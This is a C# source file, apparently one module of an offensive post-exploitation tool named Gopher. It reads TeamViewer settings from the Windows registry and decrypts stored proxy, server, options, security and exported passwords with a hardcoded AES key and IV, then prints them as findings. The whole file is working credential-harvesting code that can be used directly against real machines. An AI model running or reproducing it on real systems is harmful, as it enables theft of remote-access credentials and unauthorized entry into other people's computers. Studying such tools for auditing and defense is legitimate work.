using Microsoft.Win32;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;

namespace Gopher.Holes
{
	class TeamViewer
	{
		//Based heavily on: https://github.com/V1V1/DecryptTeamViewer/blob/master/DecryptTeamViewer/Program.cs
		private static string Decrypt(byte[] ciphertext)
		{
			AesCryptoServiceProvider aes = new AesCryptoServiceProvider
			{
				IV = new byte[] { 0x01, 0x00, 0x01, 0x00, 0x67, 0x24, 0x4f, 0x43, 0x6e, 0x67, 0x62, 0xf2, 0x5e, 0xa8, 0xd7, 0x04 },
				Key = new byte[] { 0x06, 0x02, 0x00, 0x00, 0x00, 0xa4, 0x00, 0x00, 0x52, 0x53, 0x41, 0x31, 0x00, 0x04, 0x00, 0x00 },
				Mode = CipherMode.CBC,
				Padding = PaddingMode.Zeros
			};

			return Encoding.Unicode.GetString(aes.CreateDecryptor().TransformFinalBlock(ciphertext, 0, ciphertext.Length));
		}

		public static string Dig()
		{
			string findings = "";
			Dictionary<string, string> settings = new Dictionary<string, string>();
			RegistryKey subKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\WOW6432Node\TeamViewer");

			if (subKey != null)
			{
				object accountName = subKey.GetValue("OwningManagerAccountName");

				if (accountName != null)
				{
					settings.Add("Account Name", accountName.ToString());
				}

				object proxyIP = subKey.GetValue("Proxy_IP");

				if (proxyIP != null)
				{
					settings.Add("Proxy Server", proxyIP.ToString());
				}

				object proxyUsername = subKey.GetValue("ProxyUsername");

				if (proxyUsername != null)
				{
					settings.Add("Proxy Username", proxyUsername.ToString());
				}

				object proxyPassword = subKey.GetValue("ProxyPasswordAES");

				if (proxyPassword != null)
				{
					settings.Add("Proxy Password", Decrypt((byte[])proxyPassword));
				}

				object optionsPassword = subKey.GetValue("OptionsPasswordAES");

				if (optionsPassword != null)
				{
					settings.Add("Options Password", Decrypt((byte[])optionsPassword));
				}

				object serverPassword = subKey.GetValue("ServerPasswordAES");

				if (serverPassword != null)
				{
					settings.Add("Server Password", Decrypt((byte[])serverPassword));
				}

				object securityPassword = subKey.GetValue("SecurityPasswordAES");

				if (securityPassword != null)
				{
					settings.Add("Security Password", Decrypt((byte[])securityPassword));
				}

				object exportedSecurityPassword = subKey.GetValue("SecurityPasswordExported");

				if (exportedSecurityPassword != null)
				{
					settings.Add("Exported Password", Decrypt((byte[])exportedSecurityPassword));
				}
				else
				{
					subKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\TeamViewer\Temp");

					if (subKey != null)
					{
						exportedSecurityPassword = subKey.GetValue("SecurityPasswordExported");

						if (exportedSecurityPassword != null)
						{
							settings.Add("Exported Password", Decrypt((byte[])exportedSecurityPassword));
						}
					}
				}

				subKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\TeamViewer");

				if (subKey != null)
				{
					object presentationPassword = subKey.GetValue("PresentationPassword");

					if (presentationPassword != null)
					{
						settings.Add("Presentation Password", presentationPassword.ToString());
					}
				}

				if (settings.Count > 0)
				{
					int width = 0;

					foreach (string key in settings.Keys)
					{
						if (key.Length > width)
						{
							width = key.Length;
						}
					}

					findings += "\n# ---- TeamViewer settings ---- #\n|\n";

					foreach (KeyValuePair<string, string> kvp in settings)
					{
						findings += string.Format("|   {0} : {1}\n", kvp.Key.PadRight(width, ' '), kvp.Value);
					}

					findings += "|\n# ---- #\n";
				}
			}

			return findings;
		}
	}
}
